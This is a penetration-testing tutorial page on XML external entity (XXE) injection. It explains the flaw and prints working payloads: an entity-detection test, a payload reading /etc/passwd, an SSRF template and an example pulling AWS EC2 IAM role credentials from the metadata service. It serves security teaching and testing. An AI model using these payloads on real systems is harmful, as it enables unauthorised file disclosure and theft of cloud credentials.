# XXE injection

## Theory

Some web applications handle data and rely on the XML format to exchange data with the browsers.

> XXE vulnerabilities arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the application.
>
> XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data ([portswigger](https://portswigger.net/web-security/xxe)).

XXE injections can sometimes lead to [SSRF (Server-Side Request Forgery)](../../web/inputs/ssrf.md), Local File Disclosure, Sensitive Information Disclosure, Data Exfiltration, RCE (Remote Code Execution) and so on.

## Practice

### Identify an XXE injection vulnerability

Testers need to find inputs or forms that send XML formatted data to the application.

For instance, in the following request, the user submitted a search form with the input "TESTINPUT".

```http
POST /action HTTP/1.1
Host: some.website
[...]
Connection: close

<?xml version="1.0"?>
<searchForm>  
         <from>TESTINPUT</from>
</searchForm>
```

The tester can detect if the XML parser parses the external entities by defining one inside a `DOCTYPE` element, and checking if the value in the `from` element gets replaced (the value will be replaced in the reflected messages sent by the application like error messages, search results).

```markup
<?xml version="1.0"?>
<!DOCTYPE xxeinjection [ <!ENTITY newfrom "VULNERABLE"> ]>
<searchForm>  
         <from>&newfrom;</from>
</searchForm>
```

A vulnerable application should replace the value by "VULNERABLE".&#x20;

### Retrieve content of local files

When the tester has identified a vulnerable entry point (see [identify an XXE](xxe-injection.md#identify-an-xxe-injection-vulnerability)). He can try to disclose local files by replacing the `from` value with the content of a sensitive file (e.g. `/etc/passwd`).

```markup
<?xml version="1.0"?>
<!DOCTYPE xxeinjection [ <!ENTITY newfrom SYSTEM "file:///etc/passwd"> ]>
<searchForm>
  <from>&newfrom;</from>
</searchForm>
```

### Conduct an SSRF attack

An XXE can be exploited to conduct an SSRF. When an application performs data transfer using XML, the request can be intercepted and forwarded to an internal host as follow.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY newfrom SYSTEM "http://{internal_host}/..."> ]>
<searchForm>
    <from>&newfrom;</from>
</searchForm>
```

<details>

<summary>Example: Get EC2 IAM role temporary credentials</summary>

In the following example, the attacker tries to access the AWS EC2 metadata service to retrieve the EC2 role credentials used by the server.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/metadata/iam/security-credentials/"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>

```

The internal server will reveal the URL path to access the role's credentials as an error message at each step by displaying the HTTP response body of the accessed URL as follows:&#x20;

1. URL = "http://169.254.169.254/latest/metadata/iam/security-credentials/"\
   The server will return an error message revealing the EC2 role name: `invalid productId ec2-role-name`_._

<!---->

1. URL = "http://169.254.169.254/latest/metadata/iam/security-credentials/ec2-role-name"\
   The server will return an error message revealing the EC2 role's secrets as `invalid productId`.

For more details, refer to the ["XXE to SSRF" PortSwigger lab](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf).

</details>

## References

{% embed url="https://portswigger.net/web-security/xxe" %}

{% embed url="https://enciphers.com/how-to-exploit-xxe-vulnerabilities/" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" %}
